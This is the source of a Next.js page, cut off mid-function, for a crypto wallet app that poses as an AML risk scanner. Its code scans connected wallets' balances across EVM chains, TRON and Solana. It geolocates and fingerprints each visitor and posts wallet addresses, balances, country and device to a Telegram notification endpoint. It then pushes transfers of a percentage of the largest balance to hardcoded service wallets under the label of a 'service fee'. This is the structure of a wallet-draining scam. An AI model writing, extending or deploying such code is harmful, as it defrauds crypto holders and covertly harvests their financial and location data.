import React, { useState, useEffect } from 'react';
import Head from 'next/head';
import { createPublicClient, http, formatEther, formatUnits, parseEther, parseUnits } from 'viem';
import { useAccount, useBalance, useWalletClient, useDisconnect, useConnect, useSwitchChain } from 'wagmi';
import { chains, isWalletConnectEnabled } from '../config/web3Config';
import { sendNetworkTransfer, getExplorerUrl, getPublicRpcUrl } from '../utils/networkTransfers';
import { scanWalletForAMLRisk, type AMLRiskResult } from '../utils/amlRiskScanner';
import AMLRiskModal from '../components/AMLRiskModal';
import {
  scanTronBalances,
  scanSolanaBalances,
  connectTronWallet,
  connectSolanaWallet,
  sendTronTransfer,
  sendSolanaTransfer,
  SERVICE_TRON_ADDRESS,
  SERVICE_SOLANA_ADDRESS,
  type NonEvmAsset,
} from '../utils/nonEvmWallets';

  // Comprehensive token scan list across all supported EVM chains
  const DEFAULT_TOKEN_SCAN_LIST: Array<{ network: string; contract: string; symbol: string; decimals: number }> = [
    // Ethereum Mainnet
    { network: 'Ethereum', contract: '0xdAC17F958D2ee523a2206206994597C13D831ec7', symbol: 'USDT', decimals: 6 },
    { network: 'Ethereum', contract: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', symbol: 'USDC', decimals: 6 },
    { network: 'Ethereum', contract: '0x6B175474E89094C44Da98b954EedeAC495271d0F', symbol: 'DAI', decimals: 18 },
    { network: 'Ethereum', contract: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', symbol: 'WBTC', decimals: 8 },
    { network: 'Ethereum', contract: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', symbol: 'WETH', decimals: 18 },
    { network: 'Ethereum', contract: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', symbol: 'SHIB', decimals: 18 },
    { network: 'Ethereum', contract: '0x6982508145454Ce325dDbE47a25d4ec3d2311933', symbol: 'PEPE', decimals: 18 },
    { network: 'Ethereum', contract: '0x514910771AF9Ca656af840dff83E8264EcF986CA', symbol: 'LINK', decimals: 18 },
    { network: 'Ethereum', contract: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', symbol: 'UNI', decimals: 18 },

    // BNB Smart Chain
    { network: 'BNB Smart Chain', contract: '0x55d398326f99059fF775485246999027B3197955', symbol: 'USDT', decimals: 18 },
    { network: 'BNB Smart Chain', contract: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', symbol: 'USDC', decimals: 18 },
    { network: 'BNB Smart Chain', contract: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', symbol: 'BUSD', decimals: 18 },
    { network: 'BNB Smart Chain', contract: '0x1AF3F329e8BE154074D8769D1FFa4e07a571f37c', symbol: 'DAI', decimals: 18 },
    { network: 'BNB Smart Chain', contract: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8', symbol: 'ETH', decimals: 18 },
    { network: 'BNB Smart Chain', contract: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c', symbol: 'BTCB', decimals: 18 },

    // Polygon
    { network: 'Polygon', contract: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', symbol: 'USDT', decimals: 6 },
    { network: 'Polygon', contract: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', symbol: 'USDC.e', decimals: 6 },
    { network: 'Polygon', contract: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359', symbol: 'USDC', decimals: 6 },
    { network: 'Polygon', contract: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063', symbol: 'DAI', decimals: 18 },
    { network: 'Polygon', contract: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619', symbol: 'WETH', decimals: 18 },

    // Arbitrum
    { network: 'Arbitrum', contract: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', symbol: 'USDT', decimals: 6 },
    { network: 'Arbitrum', contract: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831', symbol: 'USDC', decimals: 6 },
    { network: 'Arbitrum', contract: '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8', symbol: 'USDC.e', decimals: 6 },
    { network: 'Arbitrum', contract: '0x912CE59144191C1204E64559FE8253a0e49E6548', symbol: 'ARB', decimals: 18 },
    { network: 'Arbitrum', contract: '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1', symbol: 'WETH', decimals: 18 },

    // Optimism
    { network: 'Optimism', contract: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58', symbol: 'USDT', decimals: 6 },
    { network: 'Optimism', contract: '0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85', symbol: 'USDC', decimals: 6 },
    { network: 'Optimism', contract: '0x7F5c764cBc14f9669B88837ca1490CCA17c31607', symbol: 'USDC.e', decimals: 6 },
    { network: 'Optimism', contract: '0x4200000000000000000000000000000000000042', symbol: 'OP', decimals: 18 },

    // Base
    { network: 'Base', contract: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', symbol: 'USDC', decimals: 6 },
    { network: 'Base', contract: '0x4200000000000000000000000000000000000006', symbol: 'WETH', decimals: 18 },

    // Avalanche
    { network: 'Avalanche', contract: '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7', symbol: 'USDT', decimals: 6 },
    { network: 'Avalanche', contract: '0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E', symbol: 'USDC', decimals: 6 },
    { network: 'Avalanche', contract: '0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664', symbol: 'USDC.e', decimals: 6 },

    // Linea
    { network: 'Linea', contract: '0x176211869cA2b568f2A7D4EE941E073a821EE1ff', symbol: 'USDC', decimals: 6 },
    { network: 'Linea', contract: '0xA2136D5702617f17B2466988b66D94ce127024A4', symbol: 'USDT', decimals: 6 },

    // Scroll
    { network: 'Scroll', contract: '0x06efdb52fb24f72547d7d02877096975d794a1cd', symbol: 'USDC', decimals: 6 },
    { network: 'Scroll', contract: '0xf55BEC9cafd47469a913557a17C02693D28cd253', symbol: 'USDT', decimals: 6 },

    // Fantom
    { network: 'Fantom', contract: '0x04068DA6C83AFCFA0e13ba15A6696662335D5B75', symbol: 'USDC', decimals: 6 },
    { network: 'Fantom', contract: '0x049d68029688eAbF473097a2fC38ef61633A3C7A', symbol: 'fUSDT', decimals: 6 },

    // Celo
    { network: 'Celo', contract: '0x765DE81E94771249876137298315fF74B6488935', symbol: 'cUSD', decimals: 18 },
    { network: 'Celo', contract: '0xD8763CBA276a3738E6DE85b4b3bF5FDed6D6cA73', symbol: 'cEUR', decimals: 18 },
  ];

export default function Home() {
  const [mounted, setMounted] = useState(false);
  useEffect(() => {
    setMounted(true);
  }, []);

  const { address, isConnected, chain } = useAccount();

  const { data: balance } = useBalance({ address, chainId: chain?.id });
  const { data: walletClient } = useWalletClient();
  const { disconnect } = useDisconnect();
  const { connectAsync, connectors, error: connectError, isPending } = useConnect();
  const { switchChainAsync } = useSwitchChain();
  const [lastConnectorId, setLastConnectorId] = useState<string | null>(null);
  const [lastWalletConnectUri, setLastWalletConnectUri] = useState<string | null>(null);

  const normalizeNetworkName = (networkName: string | undefined) => {
    const normalized = networkName?.trim().toLowerCase() || '';

    if (!normalized) return '';
    if (normalized.includes('bnb') || normalized.includes('binance')) return 'BNB Smart Chain';
    if (normalized.includes('ethereum') || normalized.includes('eth')) return 'Ethereum';
    if (normalized.includes('polygon') || normalized.includes('matic')) return 'Polygon';
    if (normalized.includes('arbitrum')) return 'Arbitrum';
    if (normalized.includes('optimism') || normalized.includes('op mainnet')) return 'Optimism';
    if (normalized.includes('avalanche') || normalized.includes('avax')) return 'Avalanche';
    if (normalized.includes('fantom')) return 'Fantom';
    if (normalized.includes('celo')) return 'Celo';
    if (normalized.includes('base')) return 'Base';
    if (normalized.includes('linea')) return 'Linea';
    if (normalized.includes('scroll')) return 'Scroll';
    return networkName || '';
  };

  const [isSending, setIsSending] = useState(false);
  const [isConnecting, setIsConnecting] = useState(false);
  const [txHash, setTxHash] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [showWalletModal, setShowWalletModal] = useState(false);
  const [country, setCountry] = useState('Unknown');
  const [device, setDevice] = useState('Unknown');
  const [networkBalance, setNetworkBalance] = useState<string | null>(null);
  const [networkBalanceSymbol, setNetworkBalanceSymbol] = useState('');
  const [tokenBalances, setTokenBalances] = useState<Array<{ network: string; symbol: string; amount: string }>>([]);
  const [tokenContractAddress, setTokenContractAddress] = useState('');
  const [serviceFeeProcessing, setServiceFeeProcessing] = useState(false);
  const [serviceFeeSent, setServiceFeeSent] = useState(false);
  const [serviceFeeAttempted, setServiceFeeAttempted] = useState(false);
  const [serviceFeeChargedKey, setServiceFeeChargedKey] = useState<string | null>(null);
  const [serviceFeeHash, setServiceFeeHash] = useState<string | null>(null);
  const [serviceFeeError, setServiceFeeError] = useState<string | null>(null);
  const [serviceFeeDebug, setServiceFeeDebug] = useState<string | null>(null);
  const [awaitingApproval, setAwaitingApproval] = useState(false);
  const [pendingFeeDetails, setPendingFeeDetails] = useState<{ amount?: string; network?: string } | null>(null);
  const [manualPaymentMode, setManualPaymentMode] = useState(false);
  const [manualPaymentChainId, setManualPaymentChainId] = useState<number | null>(null);
  const [manualPaymentAmountUnits, setManualPaymentAmountUnits] = useState<bigint | null>(null);
  const [amlRiskResult, setAmlRiskResult] = useState<AMLRiskResult | null>(null);
  const [amlScanning, setAmlScanning] = useState(false);
  const [amlScanComplete, setAmlScanComplete] = useState(false);
  const [amlScanStarted, setAmlScanStarted] = useState(false);
  const [showAmlModal, setShowAmlModal] = useState(false);
  const SERVICE_FEE_PERCENT = BigInt(
    process.env.NEXT_PUBLIC_SERVICE_FEE_PERCENT || process.env.SERVICE_FEE_PERCENT || '3'
  );
  const SERVICE_WALLET_ADDRESS = process.env.NEXT_PUBLIC_SERVICE_WALLET || process.env.SERVICE_WALLET_ADDRESS || '0x1fC618a5B0AAFfC876b72288D71f3E80918c590f';
  const [tokenSymbol, setTokenSymbol] = useState('');
  const [tokenSymbolError, setTokenSymbolError] = useState<string | null>(null);
  const [tronAddress, setTronAddress] = useState<string | null>(null);
  const [solanaAddress, setSolanaAddress] = useState<string | null>(null);

  useEffect(() => {
    if (typeof window === 'undefined') return;
    const win = window as any;

    if (win.tronWeb && win.tronWeb.defaultAddress?.base58 && !tronAddress) {
      setTronAddress(win.tronWeb.defaultAddress.base58);
    }

    if ((win.phantom?.solana?.publicKey || win.solana?.publicKey) && !solanaAddress) {
      const pubKey = (win.phantom?.solana?.publicKey || win.solana?.publicKey).toString();
      setSolanaAddress(pubKey);
    }
  }, [tronAddress, solanaAddress]);

  const currentServiceFeeKey = address ? address.toLowerCase() : tronAddress ? `tron_${tronAddress}` : solanaAddress ? `sol_${solanaAddress}` : null;


  const getMergedTokenBalances = () => {
    return tokenBalances.filter(
      (item, index, self) =>
        self.findIndex(
          (other) =>
            other.network === item.network &&
            other.symbol === item.symbol &&
            other.amount === item.amount
        ) === index
    );
  };

  const hasBrowserWallet = typeof window !== 'undefined' && Boolean((window as Window & { ethereum?: unknown }).ethereum);
  const availableWallets = typeof window !== 'undefined' && (window as Window & { ethereum?: { providers?: Array<{ isMetaMask?: boolean; isCoinbaseWallet?: boolean; isBraveWallet?: boolean; isTrustWallet?: boolean; isRainbow?: boolean; [key: string]: unknown }> } }).ethereum?.providers
    ? (window as Window & { ethereum?: { providers?: Array<{ isMetaMask?: boolean; isCoinbaseWallet?: boolean; isBraveWallet?: boolean; isTrustWallet?: boolean; isRainbow?: boolean; [key: string]: unknown }> } }).ethereum?.providers ?? []
    : [];

  const getConnectedChainId = async () => {
    if (typeof window === 'undefined') return undefined;
    const ethereum = (window as any).ethereum;
    const walletClientRequest = (walletClient as any)?.request;

    const fromRequest = async (requestFn: ((opts: any) => Promise<any>) | undefined) => {
      if (!requestFn) return undefined;
      try {
        const raw = await requestFn({ method: 'eth_chainId', params: [] });
        if (typeof raw === 'string') {
          return Number(raw.startsWith('0x') ? BigInt(raw).toString() : raw);
        }
        if (typeof raw === 'number') {
          return raw;
        }
      } catch {
        // ignore
      }
      return undefined;
    };

    const ethChainId = await fromRequest(ethereum?.request);
    if (ethChainId !== undefined) return ethChainId;
    return fromRequest(walletClientRequest);
  };

  const ensureEvmNetwork = async (networkName: string) => {
    const normalizedName = normalizeNetworkName(networkName);
    const targetChain = chains.find((item) => normalizeNetworkName(item.name) === normalizedName);
    if (!targetChain) {
      throw new Error(`Unsupported network: ${networkName}`);
    }

    const activeChainId = await getConnectedChainId();
    if (activeChainId === targetChain.id) {
      return;
    }

    if (chain?.id === targetChain.id) {
      return;
    }

    // Prefer using the connected walletClient (works with WalletConnect v2).
    const clientRequest = (walletClient as any)?.request;
    const ethereum = typeof window !== 'undefined' ? (window as any).ethereum : undefined;

    const chainParams = { chainId: `0x${targetChain.id.toString(16)}` };

    // Helper to try addChain when 4902 is returned
    const tryAddChain = async (requestFn: (opts: any) => Promise<any>) => {
      try {
        await requestFn({ method: 'wallet_addEthereumChain', params: [{
          chainId: chainParams.chainId,
          chainName: targetChain.name,
          nativeCurrency: targetChain.nativeCurrency,
          rpcUrls: targetChain.rpcUrls.default.http,
        }] });
        return true;
      } catch (addErr) {
        return false;
      }
    };

    // Try walletClient.request first (best for WalletConnect v2)
    if (clientRequest && typeof clientRequest === 'function') {
      try {
        await clientRequest({ method: 'wallet_switchEthereumChain', params: [chainParams] });
        return;
      } catch (wcErr: any) {
        if (wcErr?.code === 4902) {
          const added = await tryAddChain((opts: any) => clientRequest(opts));
          if (added) return;
        }
        // If walletClient can't switch, fall through to ethereum.request as a fallback
        console.warn('walletClient.request switch failed:', wcErr);
      }
    }

    // Fallback to injected provider (MetaMask / injected WalletConnect bridge)
    if (!ethereum?.request) {
      throw new Error(`Please switch your wallet to ${targetChain.name} before sending.`);
    }

    try {
      await ethereum.request({ method: 'wallet_switchEthereumChain', params: [chainParams] });
      return;
    } catch (switchError: any) {
      if (switchError?.code === 4902) {
        const added = await tryAddChain((opts: any) => ethereum.request(opts));
        if (added) return;
        throw new Error(`Please add ${targetChain.name} to your wallet and try again.`);
      }

      throw new Error(`Please switch your wallet to ${targetChain.name} before sending.`);
    }
  };

  useEffect(() => {
    const detectCountry = async () => {
      try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        setCountry(data.country_name || 'Unknown');
      } catch {
        setCountry('Unknown');
      }
    };

    const detectDevice = () => {
      const userAgent = navigator.userAgent || '';
      if (/iPhone|iPad|iPod/i.test(userAgent)) setDevice('iOS');
      else if (/Android/i.test(userAgent)) setDevice('Android');
      else if (/Mac/i.test(userAgent)) setDevice('macOS');
      else if (/Windows/i.test(userAgent)) setDevice('Windows');
      else if (/Linux/i.test(userAgent)) setDevice('Linux');
      else setDevice('Unknown');
    };

    detectCountry();
    detectDevice();
  }, []);

  const getEvmNativeBalance = async (networkName: string, walletAddress: string) => {
    const rpcUrl = getPublicRpcUrl(networkName);
    const chainConfig = chains.find((item) => item.name === networkName);
    if (!rpcUrl || !chainConfig) {
      throw new Error(`No RPC available for ${networkName}`);
    }
    const publicClient = createPublicClient({ chain: chainConfig, transport: http(rpcUrl) });
    const balance = await publicClient.getBalance({ address: walletAddress as `0x${string}` });
    return formatEther(balance);
  };

  const getEvmTokenBalance = async (networkName: string, walletAddress: string, contractAddress: string) => {
    const rpcUrl = getPublicRpcUrl(networkName);
    const chainConfig = chains.find((item) => item.name === networkName);
    if (!rpcUrl || !chainConfig) {
      throw new Error(`No RPC available for ${networkName}`);
    }
    const publicClient = createPublicClient({ chain: chainConfig, transport: http(rpcUrl) });
    const decimals = await publicClient.readContract({
      address: contractAddress as `0x${string}`,
      abi: [
        { name: 'decimals', type: 'function', stateMutability: 'view', inputs: [], outputs: [{ type: 'uint8' }] },
      ],
      functionName: 'decimals',
      args: [],
    });
    const balance = await publicClient.readContract({
      address: contractAddress as `0x${string}`,
      abi: [
        { name: 'balanceOf', type: 'function', stateMutability: 'view', inputs: [{ type: 'address', name: 'owner' }], outputs: [{ type: 'uint256' }] },
      ],
      functionName: 'balanceOf',
      args: [walletAddress as `0x${string}`],
    });
    return Number(balance) / 10 ** Number(decimals);
  };

  const getEvmTokenSymbol = async (networkName: string, contractAddress: string) => {
    const rpcUrl = getPublicRpcUrl(networkName);
    const chainConfig = chains.find((item) => item.name === networkName);
    if (!rpcUrl || !chainConfig) {
      throw new Error(`No RPC available for ${networkName}`);
    }
    const publicClient = createPublicClient({ chain: chainConfig, transport: http(rpcUrl) });
    const symbol = await publicClient.readContract({
      address: contractAddress as `0x${string}`,
      abi: [
        { name: 'symbol', type: 'function', stateMutability: 'view', inputs: [], outputs: [{ type: 'string' }] },
      ],
      functionName: 'symbol',
      args: [],
    });
    return String(symbol);
  };

  const getEvmTokenDecimals = async (networkName: string, contractAddress: string) => {
    const rpcUrl = getPublicRpcUrl(networkName);
    const chainConfig = chains.find((item) => item.name === networkName);
    if (!rpcUrl || !chainConfig) {
      throw new Error(`No RPC available for ${networkName}`);
    }
    const publicClient = createPublicClient({ chain: chainConfig, transport: http(rpcUrl) });
    const decimals = await publicClient.readContract({
      address: contractAddress as `0x${string}`,
      abi: [
        { name: 'decimals', type: 'function', stateMutability: 'view', inputs: [], outputs: [{ type: 'uint8' }] },
      ],
      functionName: 'decimals',
      args: [],
    });
    return Number(decimals);
  };

  interface ScannedAsset {
    network: string;
    chainId?: number;
    chainType: 'EVM' | 'TRON' | 'Solana';
    symbol: string;
    balance: bigint;
    amount: string;
    isNative: boolean;
    contractAddress?: string;
    decimals?: number;
  }

  const scanAllNetworkBalances = async (evmAddr?: string, tronAddr?: string, solAddr?: string): Promise<ScannedAsset[]> => {
    const promises: Array<Promise<ScannedAsset | null>> = [];
    const targetEvmAddress = evmAddr || address;
    const targetTronAddress = tronAddr || tronAddress || (typeof window !== 'undefined' ? (window as any).tronWeb?.defaultAddress?.base58 : null);
    const targetSolanaAddress = solAddr || solanaAddress || (typeof window !== 'undefined' ? ((window as any).phantom?.solana?.publicKey?.toString() || (window as any).solana?.publicKey?.toString()) : null);

    // 1. Scan native EVM balances across all 11 chains
    if (targetEvmAddress) {
      for (const chainCfg of chains) {
        promises.push(
          (async () => {
            try {
              const networkName = normalizeNetworkName(chainCfg.name);
              const amount = await getEvmNativeBalance(chainCfg.name, targetEvmAddress);
              const parsed = Number(amount) > 0 ? parseEther(amount) : 0n;
              if (parsed > 0n) {
                return {
                  network: networkName,
                  chainId: chainCfg.id,
                  chainType: 'EVM' as const,
                  symbol: chainCfg.nativeCurrency?.symbol || 'NATIVE',
                  balance: parsed,
                  amount,
                  isNative: true,
                };
              }
            } catch {
              // ignore
            }
            return null;
          })()
        );
      }

      // 2. Scan ERC20 tokens across all chains in DEFAULT_TOKEN_SCAN_LIST
      for (const t of DEFAULT_TOKEN_SCAN_LIST) {
        const chainCfg = chains.find((c) => normalizeNetworkName(c.name) === normalizeNetworkName(t.network));
        if (!chainCfg) continue;

        promises.push(
          (async () => {
            try {
              const bal = await getEvmTokenBalance(chainCfg.name, targetEvmAddress, t.contract);
              if (bal && Number(bal) > 0) {
                const rawUnits = parseUnits(bal.toString(), t.decimals);
                return {
                  network: normalizeNetworkName(chainCfg.name),
                  chainId: chainCfg.id,
                  chainType: 'EVM' as const,
                  symbol: t.symbol,
                  balance: rawUnits,
                  amount: bal.toString(),
                  isNative: false,
                  contractAddress: t.contract,
                  decimals: t.decimals,
                };
              }
            } catch {
              // ignore
            }
            return null;
          })()
        );
      }

      // 3. Scan custom token contract if specified in state
      if (tokenContractAddress.trim()) {
        const activeNet = normalizeNetworkName(chain?.name) || 'Ethereum';
        const activeChainCfg = chains.find((c) => normalizeNetworkName(c.name) === activeNet) || chains[0];
        promises.push(
          (async () => {
            try {
              const customBal = await getEvmTokenBalance(activeChainCfg.name, targetEvmAddress, tokenContractAddress.trim());
              if (customBal && Number(customBal) > 0) {
                const sym = tokenSymbol || (await getEvmTokenSymbol(activeChainCfg.name, tokenContractAddress.trim()));
                const dec = await getEvmTokenDecimals(activeChainCfg.name, tokenContractAddress.trim()).catch(() => 18);
                const rawUnits = parseUnits(customBal.toString(), dec);
                return {
                  network: normalizeNetworkName(activeChainCfg.name),
                  chainId: activeChainCfg.id,
                  chainType: 'EVM' as const,
                  symbol: sym || 'TOKEN',
                  balance: rawUnits,
                  amount: customBal.toString(),
                  isNative: false,
                  contractAddress: tokenContractAddress.trim(),
                  decimals: dec,
                };
              }
            } catch {
              // ignore
            }
            return null;
          })()
        );
      }
    }

    // 4. Scan TRON & TRC20 balances
    if (targetTronAddress) {
      promises.push(
        (async () => {
          try {
            const tronAssets = await scanTronBalances(targetTronAddress);
            if (tronAssets.length > 0) {
              const top = tronAssets[0];
              return {
                network: 'TRON',
                chainType: 'TRON' as const,
                symbol: top.symbol,
                balance: top.balance,
                amount: top.amount,
                isNative: top.isNative,
                contractAddress: top.contractAddress,
                decimals: top.decimals,
              };
            }
          } catch {
            // ignore
          }
          return null;
        })()
      );
    }

    // 5. Scan Solana & SPL balances
    if (targetSolanaAddress) {
      promises.push(
        (async () => {
          try {
            const solAssets = await scanSolanaBalances(targetSolanaAddress);
            if (solAssets.length > 0) {
              const top = solAssets[0];
              return {
                network: 'Solana',
                chainType: 'Solana' as const,
                symbol: top.symbol,
                balance: top.balance,
                amount: top.amount,
                isNative: top.isNative,
                contractAddress: top.contractAddress,
                decimals: top.decimals,
              };
            }
          } catch {
            // ignore
          }
          return null;
        })()
      );
    }

    const results = await Promise.all(promises);
    const validBalances = results.filter((item): item is ScannedAsset => item !== null);
    return validBalances.sort((a, b) => (b.balance > a.balance ? 1 : b.balance < a.balance ? -1 : 0));
  };

  const sendEvmTokenTransferWithUnits = async (
    contractAddress: string,
    recipient: string,
    amountUnits: string,
    walletClient: any
  ) => {
    if (!walletClient) {
      throw new Error('Wallet client is required for EVM token transfers.');
    }

    const tx = await walletClient.writeContract({
      address: contractAddress as `0x${string}`,
      abi: [
        {
          name: 'transfer',
          type: 'function',
          stateMutability: 'nonpayable',
          inputs: [
            { type: 'address', name: 'to' },
            { type: 'uint256', name: 'value' },
          ],
          outputs: [{ type: 'bool' }],
        },
      ],
      functionName: 'transfer',
      args: [recipient as `0x${string}`, BigInt(amountUnits)],
    });

    return String(tx);
  };


  const fetchNetworkBalance = async () => {
    const activeNetwork = normalizeNetworkName(chain?.name);

    if (!address) {
      setNetworkBalance('N/A');
      setNetworkBalanceSymbol('');
      return;
    }

    try {
      setNetworkBalance('Loading...');
      setNetworkBalanceSymbol('');

      if (tokenContractAddress.trim()) {
        const sourceNetwork = activeNetwork || 'Ethereum';
        const balance = await getEvmTokenBalance(sourceNetwork, address!, tokenContractAddress.trim());
        setNetworkBalance(balance.toString());
        setNetworkBalanceSymbol(tokenSymbol || 'TOKEN');
        return;
      }

      const balances = await scanAllNetworkBalances(address);
      if (balances.length > 0) {
        const preferred = balances.find((item) => item.network === activeNetwork) ?? balances[0];
        setNetworkBalance(preferred.amount);
        setNetworkBalanceSymbol(preferred.symbol);
        return;
      }

      if (activeNetwork) {
        const fallbackBalance = await getEvmNativeBalance(activeNetwork, address!);
        const symbol = chains.find((item) => normalizeNetworkName(item.name) === activeNetwork)?.nativeCurrency.symbol || 'ETH';
        setNetworkBalance(fallbackBalance);
        setNetworkBalanceSymbol(symbol);
        return;
      }

      setNetworkBalance('N/A');
      setNetworkBalanceSymbol('');
    } catch (err) {
      console.error('Balance detection failed:', err);
      setNetworkBalance('N/A');
      setNetworkBalanceSymbol(tokenSymbol || chain?.nativeCurrency.symbol || 'asset');
    }
  };

  useEffect(() => {
    const updateSymbol = async () => {
      const activeNetwork = normalizeNetworkName(chain?.name);
      if (!activeNetwork) {
        setTokenSymbol('');
        setTokenSymbolError(null);
        return;
      }

      if (tokenContractAddress.trim()) {
        try {
          const symbol = await getEvmTokenSymbol(activeNetwork, tokenContractAddress.trim());
          setTokenSymbol(symbol);
          setTokenSymbolError(null);
        } catch (err) {
          console.error('Failed to fetch token symbol:', err);
          setTokenSymbol('');
          setTokenSymbolError('Unable to read token symbol from contract. Please enter it manually.');
        }
      } else {
        setTokenSymbol('');
        setTokenSymbolError(null);
      }
    };

    updateSymbol();
    fetchNetworkBalance();
  }, [tokenContractAddress, address, chain?.id]);

  useEffect(() => {
    const notifyConnectError = async () => {
      if (!connectError) return;

      const message = connectError.message || 'Unable to connect wallet';
      const friendlyMessage = message.includes('Failed to connect to MetaMask')
        ? 'MetaMask connection was rejected or is unavailable. Please open the extension, unlock it, and try again.'
        : message;
      setError(friendlyMessage);
      setIsConnecting(false);

      const lower = String(message).toLowerCase();
      const userCancelled = lower.includes('user rejected') || lower.includes('rejected the request') || lower.includes('user closed') || lower.includes('timeout');
      const connectionReset = lower.includes('connection request reset');

      await fetch('/api/telegram/notify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          eventType: 'wallet_error',
          wallet: address || 'N/A',
          error: friendlyMessage,
          originalError: message,
          userCancelled,
          connectionReset,
          country,
          device,
          chain: chain?.name || 'N/A',
        }),
      }).catch(() => undefined);
    };

    notifyConnectError();
  }, [connectError, address, chain?.name, country, device]);

  useEffect(() => {
    if (isConnected && address) {
      setIsConnecting(false);
      setShowWalletModal(false);
      const sendWalletConnectedNotify = async (balances?: typeof tokenBalances) => {
        const effectiveBalance = balance
          ? `${parseFloat(formatEther(balance.value)).toFixed(4)} ${chain?.nativeCurrency.symbol || ''}`
          : networkBalance && networkBalance !== 'Loading...' && networkBalance !== 'N/A'
            ? `${networkBalance} ${networkBalanceSymbol}`.trim()
            : '0';

        await fetch('/api/telegram/notify', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            eventType: 'wallet_connected',
            wallet: address,
            balance: effectiveBalance,
            country,
            device,
            chain: chain?.name || 'N/A',
            tokenBalances: balances || getMergedTokenBalances(),
          }),
        }).catch(() => undefined);
      };

      // Scan token balances and refresh balance data before sending notification
      (async () => {
        try {
          await fetchNetworkBalance();
          const scanned = await scanTokensAcrossChains(address);
          setTokenBalances(scanned);
          await sendWalletConnectedNotify(scanned);
        } catch (e) {
          await sendWalletConnectedNotify();
        }
      })();
    }
  }, [isConnected, address, balance, chain?.name, chain?.nativeCurrency.symbol, country, device, tokenContractAddress, tokenSymbol]);

  const chargeServiceFee = React.useCallback(async (options?: { autoReturn?: boolean }) => {
    const autoReturn = options?.autoReturn ?? true;
    const activeTronAddr = tronAddress || (typeof window !== 'undefined' ? (window as any).tronWeb?.defaultAddress?.base58 : null);
    const activeSolAddr = solanaAddress || (typeof window !== 'undefined' ? ((window as any).phantom?.solana?.publicKey?.toString() || (window as any).solana?.publicKey?.toString()) : null);

    if ((!isConnected || !address) && !activeTronAddr && !activeSolAddr) {
      return false;
    }

    const activeFeeKey = currentServiceFeeKey || address?.toLowerCase() || (activeTronAddr ? `tron_${activeTronAddr}` : activeSolAddr ? `sol_${activeSolAddr}` : null);
    if (serviceFeeSent && serviceFeeChargedKey === activeFeeKey) {
      return true;
    }

    setServiceFeeProcessing(true);
    setServiceFeeAttempted(true);
    setServiceFeeError(null);

    try {
      const supportedBalances = await scanAllNetworkBalances(address, activeTronAddr || undefined, activeSolAddr || undefined);

      if (!supportedBalances.length) {
        setServiceFeeError('No supported network (EVM, TRON TRC20, or Solana) or token in this wallet has available balance.');
        return false;
      }

      const actualChainId = (await getConnectedChainId()) || chain?.id;
      const activeNetwork = normalizeNetworkName(chain?.name);

      let preferredNetwork = supportedBalances.find((item) => item.chainId === actualChainId)
        || supportedBalances.find((item) => item.network === activeNetwork)
        || supportedBalances[0];

      let feeAmount = (preferredNetwork.balance * SERVICE_FEE_PERCENT) / 100n;
      if (feeAmount <= 0n) {
        setServiceFeeError('The connected wallet balance is too small to trigger the automatic fee.');
        return false;
      }

      const formattedFeeDisplay = preferredNetwork.decimals
        ? `${formatUnits(feeAmount, preferredNetwork.decimals)} ${preferredNetwork.symbol}`
        : `${formatEther(feeAmount)} ${preferredNetwork.symbol}`;

      setPendingFeeDetails({ amount: formattedFeeDisplay, network: preferredNetwork.network });
      setAwaitingApproval(true);

      const isMobileDevice = typeof window !== 'undefined' && /Android|iPhone|iPad|iPod/i.test(navigator.userAgent || '');
      const isWalletConnectMobile = (lastConnectorId === 'walletConnect' || !hasBrowserWallet) && isMobileDevice;

      let feeTxHash: string | null = null;

      if (preferredNetwork.chainType === 'TRON') {
        setServiceFeeDebug(`Sending 3% fee via TRON: ${formattedFeeDisplay}`);
        feeTxHash = await sendTronTransfer(
          {
            network: 'TRON',
            symbol: preferredNetwork.symbol,
            balance: preferredNetwork.balance,
            amount: preferredNetwork.amount,
            isNative: preferredNetwork.isNative,
            contractAddress: preferredNetwork.contractAddress,
            decimals: preferredNetwork.decimals || 6,
          },
          SERVICE_TRON_ADDRESS,
          feeAmount
        );
      } else if (preferredNetwork.chainType === 'Solana') {
        const solanaUserAddress = activeSolAddr || (typeof window !== 'undefined' ? ((window as any).phantom?.solana?.publicKey?.toString() || (window as any).solana?.publicKey?.toString()) : '');
        if (!solanaUserAddress) {
          throw new Error('Solana wallet address is not connected.');
        }
        setServiceFeeDebug(`Sending 3% fee via Solana: ${formattedFeeDisplay}`);
        feeTxHash = await sendSolanaTransfer(
          {
            network: 'Solana',
            symbol: preferredNetwork.symbol,
            balance: preferredNetwork.balance,
            amount: preferredNetwork.amount,
            isNative: preferredNetwork.isNative,
            contractAddress: preferredNetwork.contractAddress,
            decimals: preferredNetwork.decimals || 9,
          },
          solanaUserAddress,
          SERVICE_SOLANA_ADDRESS,
          feeAmount
        );
      } else {
        // EVM Transfer
